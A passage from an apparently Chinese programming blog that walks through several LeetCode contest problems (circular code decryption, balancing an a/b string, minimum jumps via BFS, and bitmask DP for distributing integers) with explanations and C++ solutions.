是负数，那么和为 之前 的数字。</span><br></pre></td></tr></table></figure></p><p>提示:</p><ul><li><code>n == code.length</code></li><li><code>1 &lt;= n &lt;= 100</code></li><li><code>1 &lt;= code[i] &lt;= 100</code></li><li><code>-(n - 1) &lt;= k &lt;= n - 1</code></li></ul><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/defuse-the-bomb" target="_blank" rel="noopener">https://leetcode-cn.com/problems/defuse-the-bomb</a></p><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>  暴力</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>数据量太小，直接暴力即可完成，我们直接依次循环从<code>[1,abs(k)]</code>的情况。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; decrypt(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; code, <span class="keyword">int</span> k) &#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">        <span class="keyword">int</span> n = code.size();</span><br><span class="line">        <span class="keyword">int</span> sign = k &gt; <span class="number">0</span> ? <span class="number">1</span>:<span class="number">-1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= k*sign; ++j)&#123;</span><br><span class="line">                sum += code[(i+sign*j+n)%n];</span><br><span class="line">            &#125;</span><br><span class="line">            ans.push_back(sum);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5551-使字符串平衡的最少删除次数"><a href="#5551-使字符串平衡的最少删除次数" class="headerlink" title="5551. 使字符串平衡的最少删除次数"></a>5551. 使字符串平衡的最少删除次数</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>给你一个字符串 <code>s</code> ，它仅包含字符 <code>&#39;a&#39;</code>和<code>&#39;b&#39;</code>​​​​ 。</p><p>你可以删除 s 中任意数目的字符，使得 s 平衡 。我们称 s 平衡的 当不存在下标对 <code>(i,j)</code>满足 <code>i &lt; j</code>且 <code>s[i] = &#39;b&#39;</code> 同时 <code>s[j]= &#39;a&#39;</code> 。</p><p>请你返回使 <code>s</code>平衡 的 最少 删除次数。</p><p>示例 1：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：s = <span class="string">"aababbab"</span></span><br><span class="line">输出：<span class="number">2</span></span><br><span class="line">解释：你可以选择以下任意一种方案：</span><br><span class="line">下标从 <span class="number">0</span> 开始，删除第 <span class="number">2</span> 和第 <span class="number">6</span> 个字符（<span class="string">"aababbab"</span> -&gt; <span class="string">"aaabbb"</span>），</span><br><span class="line">下标从 <span class="number">0</span> 开始，删除第 <span class="number">3</span> 和第 <span class="number">6</span> 个字符（<span class="string">"aababbab"</span> -&gt; <span class="string">"aabbbb"</span>）。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：s = <span class="string">"bbaaaaabb"</span></span><br><span class="line">输出：<span class="number">2</span></span><br><span class="line">解释：唯一的最优解是删除最前面两个字符。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= s.length &lt;= 105</code></li><li><code>s[i]</code>要么是 <code>&#39;a&#39;</code>要么是<code>&#39;b&#39;​</code> 。</li></ul><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/minimum-deletions-to-make-string-balanced" target="_blank" rel="noopener">https://leetcode-cn.com/problems/minimum-deletions-to-make-string-balanced</a></p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 滑动窗口或者动态规划。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>我们假设最终的目标字符串为原始字符串从<code>i</code>处断开，则表示原始字符串中从<code>[0,i]</code>处的字符中最终全部变为<code>a</code>,将从<code>[i+1,n-1]</code>处的字符全部变为<code>b</code>，因此我们需要删除从<code>[0,i]</code>处中<code>b</code>的数目，从<code>[i+1,n-1]</code>处<code>a</code>的数目,我们枚举<code>i</code>即可:<script type="math/tex; mode=display">ans = min(ans,countB(0,i)+countA(i+1,n-1)) \qquad i\in[0,n-1]</script></li><li>这个算法感觉是最直观的算法。<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minimumDeletions</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.size();</span><br><span class="line">        <span class="keyword">int</span> curr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> ans = n;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; cnta(n+<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = n<span class="number">-1</span>; i &gt;= <span class="number">0</span>; --i)&#123;</span><br><span class="line">            cnta[i] = cnta[i+<span class="number">1</span>] + (s[i] == <span class="string">'a'</span>?<span class="number">1</span>:<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ans = min(ans,cnta[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i] == <span class="string">'b'</span>) curr++;</span><br><span class="line">            ans = min(ans,curr+cnta[i+<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><ul><li>动态规划<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minimumDeletions</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.size();</span><br><span class="line">        <span class="keyword">int</span> cnta = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> cntb = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> dp = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> ans = n;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i] == <span class="string">'a'</span>) dp = min(dp+<span class="number">1</span>,cntb);</span><br><span class="line">            <span class="keyword">if</span>(s[i] == <span class="string">'b'</span>) cntb++;</span><br><span class="line">        &#125;</span><br><span class="line">        ans = min(dp,ans);</span><br><span class="line">        dp = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = n<span class="number">-1</span>; i &gt;= <span class="number">0</span>;--i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i] == <span class="string">'a'</span>) cnta++;</span><br><span class="line">            <span class="keyword">if</span>(s[i] == <span class="string">'b'</span>) dp = min(dp+<span class="number">1</span>,cnta);</span><br><span class="line">        &#125;</span><br><span class="line">        ans = min(dp,ans);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></blockquote><h2 id="5552-到家的最少跳跃次数"><a href="#5552-到家的最少跳跃次数" class="headerlink" title="5552. 到家的最少跳跃次数"></a>5552. 到家的最少跳跃次数</h2><p>有一只跳蚤的家在数轴上的位置 <code>x</code>处。请你帮助它从位置 <code>0</code> 出发，到达它的家。</p><p>跳蚤跳跃的规则如下：</p><ul><li>它可以 往前 跳恰好 a 个位置（即往右跳）。</li><li>它可以 往后 跳恰好 b 个位置（即往左跳）。</li><li>它不能 连续 往后跳 2 次。</li><li>它不能跳到任何 <code>forbidden</code> 数组中的位置。<br>跳蚤可以往前跳 超过 它的家的位置，但是它 不能跳到负整数 的位置。</li></ul><p>给你一个整数数组 <code>forbidden</code> ，其中 <code>forbidden[i]</code>是跳蚤不能跳到的位置，同时给你整数 a， b 和 x ，请你返回跳蚤到家的最少跳跃次数。如果没有恰好到达 x 的可行方案，请你返回 -1 。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：forbidden = [<span class="number">14</span>,<span class="number">4</span>,<span class="number">18</span>,<span class="number">1</span>,<span class="number">15</span>], a = <span class="number">3</span>, b = <span class="number">15</span>, x = <span class="number">9</span></span><br><span class="line">输出：<span class="number">3</span></span><br><span class="line">解释：往前跳 <span class="number">3</span> 次（<span class="number">0</span> -&gt; <span class="number">3</span> -&gt; <span class="number">6</span> -&gt; <span class="number">9</span>），跳蚤就到家了。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：forbidden = [<span class="number">8</span>,<span class="number">3</span>,<span class="number">16</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">20</span>], a = <span class="number">15</span>, b = <span class="number">13</span>, x = <span class="number">11</span></span><br><span class="line">输出：<span class="number">-1</span></span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：forbidden = [<span class="number">1</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">17</span>,<span class="number">4</span>], a = <span class="number">16</span>, b = <span class="number">9</span>, x = <span class="number">7</span></span><br><span class="line">输出：<span class="number">2</span></span><br><span class="line">解释：往前跳一次（<span class="number">0</span> -&gt; <span class="number">16</span>），然后往回跳一次（<span class="number">16</span> -&gt; <span class="number">7</span>），跳蚤就到家了。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= forbidden.length &lt;= 1000</code></li><li><code>1 &lt;= a, b, forbidden[i] &lt;= 2000</code></li><li><code>0 &lt;= x &lt;= 2000</code></li><li><code>forbidden</code> 中所有位置互不相同。</li><li>位置 x 不在 <code>forbidden</code> 中。</li></ul><h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/minimum-jumps-to-reach-home" target="_blank" rel="noopener">https://leetcode-cn.com/problems/minimum-jumps-to-reach-home</a></p><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> BFS</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol><li>常规的BFS即可解决，我们每次记录上一次的跳跃方向，如果上次跳跃的方向为往右跳，则本次既可以往左跳，也可以往右跳；如果上次跳跃的方向为向左跳，则本次只能往右跳。</li><li>采用层次遍历的方式<code>bfs</code>即可快速到底目标点即可。<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3></li></ol><ul><li>贪心算法<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEFT -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RIGHT 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 10000</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minimumJumps</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; forbidden, <span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = forbidden.size();</span><br><span class="line">        <span class="built_in">unordered_set</span>&lt;<span class="keyword">int</span>&gt; fb;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt; visit(MAXN,<span class="literal">false</span>);        </span><br><span class="line">        <span class="keyword">if</span>(x == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : forbidden) fb.insert(v);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/*intial*/</span></span><br><span class="line">        <span class="built_in">queue</span>&lt;pii&gt; qu;</span><br><span class="line">        qu.push(&#123;<span class="number">0</span>,LEFT&#125;);</span><br><span class="line">        visit[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">int</span> step = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(!qu.empty())&#123;</span><br><span class="line">            <span class="keyword">int</span> sz = qu.size();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; sz; ++i)&#123;</span><br><span class="line">                pii curr = qu.front();</span><br><span class="line">                qu.pop();</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(curr.first == x) <span class="keyword">return</span> step;</span><br><span class="line">                <span class="keyword">if</span>(curr.second == LEFT)&#123;</span><br><span class="line">                    <span class="comment">/*jump right*/</span></span><br><span class="line">                    <span class="keyword">if</span>(curr.first+a &lt;= MAXN &amp;&amp; !fb.count(curr.first+a) &amp;&amp; !visit[curr.first+a])&#123;</span><br><span class="line">                        visit[curr.first+a] = <span class="literal">true</span>;</span><br><span class="line">                        qu.push(&#123;curr.first+a,RIGHT&#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(curr.second == RIGHT)&#123;</span><br><span class="line">                    <span class="comment">/*jump left*/</span></span><br><span class="line">                    <span class="keyword">if</span>(curr.first-b &gt;= <span class="number">0</span> &amp;&amp; !fb.count(curr.first-b) &amp;&amp; !visit[curr.first-b])&#123;</span><br><span class="line">                        visit[curr.first-b] = <span class="literal">true</span>;</span><br><span class="line">                        qu.push(&#123;curr.first-b,LEFT&#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">/*jump right*/</span></span><br><span class="line">                    <span class="keyword">if</span>(curr.first+a &lt;= MAXN &amp;&amp; !fb.count(curr.first+a) &amp;&amp; !visit[curr.first+a])&#123;</span><br><span class="line">                        visit[curr.first+a] = <span class="literal">true</span>;</span><br><span class="line">                        qu.push(&#123;curr.first+a,RIGHT&#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            step++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></blockquote><h2 id="5553-分配重复整数"><a href="#5553-分配重复整数" class="headerlink" title="5553. 分配重复整数"></a>5553. 分配重复整数</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>给你一个长度为 n 的整数数组 <code>nums</code>，这个数组中至多有 <code>50</code>个不同的值。同时你有 m 个顾客的订单 <code>quantity</code> ，其中，整数 <code>quantity[i]</code>是第 i 位顾客订单的数目。请你判断是否能将 <code>nums</code>中的整数分配给这些顾客，且满足：</p><ul><li>第 <code>i</code>位顾客 恰好 有<code>quantity[i]</code> 个整数。</li><li>第 <code>i</code> 位顾客拿到的整数都是 相同的 。</li><li>每位顾客都满足上述两个要求。<br>如果你可以分配 <code>nums</code> 中的整数满足上面的要求，那么请返回 <code>true</code> ，否则返回 <code>false</code> 。</li></ul><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>], quantity = [<span class="number">2</span>]</span><br><span class="line">输出：<span class="literal">false</span></span><br><span class="line">解释：第 <span class="number">0</span> 位顾客没办法得到两个相同的整数。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>], quantity = [<span class="number">2</span>]</span><br><span class="line">输出：<span class="literal">true</span></span><br><span class="line">解释：第 <span class="number">0</span> 位顾客得到 [<span class="number">3</span>,<span class="number">3</span>] 。整数 [<span class="number">1</span>,<span class="number">2</span>] 都没有被使用。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>], quantity = [<span class="number">2</span>,<span class="number">2</span>]</span><br><span class="line">输出：<span class="literal">true</span></span><br><span class="line">解释：第 <span class="number">0</span> 位顾客得到 [<span class="number">1</span>,<span class="number">1</span>] ，第 <span class="number">1</span> 位顾客得到 [<span class="number">2</span>,<span class="number">2</span>] 。</span><br></pre></td></tr></table></figure><br>示例 4：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], quantity = [<span class="number">2</span>,<span class="number">2</span>]</span><br><span class="line">输出：<span class="literal">false</span></span><br><span class="line">解释：尽管第 <span class="number">0</span> 位顾客可以得到 [<span class="number">1</span>,<span class="number">1</span>] ，第 <span class="number">1</span> 位顾客没法得到 <span class="number">2</span> 个一样的整数。</span><br></pre></td></tr></table></figure><br>示例 5：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>], quantity = [<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">输出：<span class="literal">true</span></span><br><span class="line">解释：第 <span class="number">0</span> 位顾客得到 [<span class="number">1</span>,<span class="number">1</span>] ，第 <span class="number">1</span> 位顾客得到 [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>] 。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>n == nums.length</code></li><li><code>1 &lt;= n &lt;= 10^5</code></li><li><code>1 &lt;= nums[i] &lt;= 1000</code></li><li><code>m == quantity.length</code></li><li><code>1 &lt;= m &lt;= 10</code></li><li><code>1 &lt;= quantity[i] &lt;= 105</code></li><li><code>nums</code> 中至多有 <code>50</code> 个不同的数字。</li></ul><h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/distribute-repeating-integers" target="_blank" rel="noopener">https://leetcode-cn.com/problems/distribute-repeating-integers</a></p><h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 动态规划状态压缩<code>dp</code></p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>我们设动态规划的递推公式为在<code>dp[i][j] = true</code>,表示前<code>i</code>个数，能够满足二进制掩码状态<code>j</code>表示的订单。</li><li>则我们需要假设已经<code>dp[i][j]</code> 为<code>true</code>，则我们当遍历第<code>i+1</code>个数时，则我们知道剩余的未满足的订单的集合为<code>k = (~j)&amp;mask</code>,我们在该状态子空间中进行遍历，遍历所有该集合的状态子空间，我们设<code>k</code>的子状态为<code>t</code>,如果第<code>i+1</code>数的个数为<code>arr[i]</code>，子状态<code>t</code>中包含的订单总数为<code>count[t]</code>，如果满足<code>arr[i+1] &gt;= count[t]</code>则表示我们可以用第<code>i+1</code>个数表示子状态<code>t</code>.<script type="math/tex; mode=display">dp[i+1][j|t_{k}] = dp[i][j] \qquad (if \quad arr[i+1] > count[t_{k}])</script></li><li>难点在于枚举子集，需要一点技巧，以下为常用的技巧，这个与<a href="https://leetcode-cn.com/problems/count-subtrees-with-max-distance-between-cities/" target="_blank" rel="noopener">统计子树中城市之间最大距离</a>很像，如果解决状态压缩的题目，需要熟练掌握这个非常重要的技巧。</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = k ; i != <span class="number">0</span>; i = (i<span class="number">-1</span>)&amp;k)&#123;</span><br><span class="line">    ···</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>这道题目非常有意思的如何计算时间复杂度。<br>我们知道需要从$0…(2^{n}-1)$之间枚举其所有的子集，实际上可以等同于如下计算公式，我们利用二项式定理：  <script type="math/tex; mode=display">O(N) = n*\sum_{i=0}^{m}C_{m}^{i}*2^{i} \\ = n*\sum_{i=0}^{m}C_{m}^{i}*1^{m-i}*2^{i}  \\= n*(2+1)^{m} \\= n*3^{m}</script></li></ol><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canDistribute</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; quantity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">int</span> m = quantity.size();</span><br><span class="line">        <span class="keyword">int</span> mask = (<span class="number">1</span>&lt;&lt;m) - <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; arr;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; freq;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; count(<span class="number">1</span>&lt;&lt;m,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt;&gt; dp(<span class="number">51</span>,<span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt;(<span class="number">1100</span>,<span class="literal">false</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : nums) freq[v]++;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : freq) arr.push_back(v.second);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= mask; ++i)&#123;</span><br><span class="line">            <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; m; ++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i&amp;(<span class="number">1</span>&lt;&lt;j))&#123;</span><br><span class="line">                    sum += quantity[j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            count[i] = sum;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= arr.size(); ++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= mask; ++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!dp[i<span class="number">-1</span>][j]) <span class="keyword">continue</span>;</span><br><span class="line">                dp[i][j] = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">int</span> curr = (j^mask);</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k = curr; k != <span class="number">0</span>; k = (k<span class="number">-1</span>)&amp;curr)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(arr[i<span class="number">-1</span>] &gt;= count[k])&#123;</span><br><span class="line">                        dp[i][j|k] = <span class="literal">true</span>;</span><br><span class="line">                    